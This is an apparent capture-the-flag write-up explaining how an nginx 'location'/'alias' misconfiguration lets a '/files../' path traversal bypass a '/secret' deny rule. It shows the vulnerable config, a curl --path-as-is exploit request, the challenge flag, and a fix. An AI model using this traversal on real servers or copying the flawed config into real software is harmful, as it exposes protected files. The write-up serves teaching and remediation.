# 05 · proxy-acl (hard)

`/secret/flag.txt` returns 403 (enforced by nginx); `/files/` serves downloads.
The flaw is in the nginx `location`/`alias` configuration.

## Vulnerability
```nginx
location /secret { deny all; return 403; }

location /files {                      # no trailing slash
    alias /var/www/protected/files/;   # alias ends with a slash
}
```
With a prefix `location /files` (no trailing slash) plus `alias`, nginx replaces
the matched prefix with the alias target and appends the rest of the URI literally
— without collapsing `../`:
```
/files../secret/flag.txt
  -> /var/www/protected/files/ + ../secret/flag.txt
  -> /var/www/protected/secret/flag.txt
```
The `/secret` ACL never fires, because the request path starts with `/files`.

## Exploitation
Send the traversal raw so the client doesn't normalise it:
```
curl --path-as-is http://TARGET/files../secret/flag.txt
```

## Flag
```
SecurinetsENIT{4l14s_w1th0ut_a_sl4sh_1s_a_d00r}
```

## Fix
Give `alias` locations a trailing slash on both sides
(`location /files/ { alias .../files/; }`), or use `root` instead of `alias`, and
enforce access control at the filesystem/backend, not only by URL prefix.
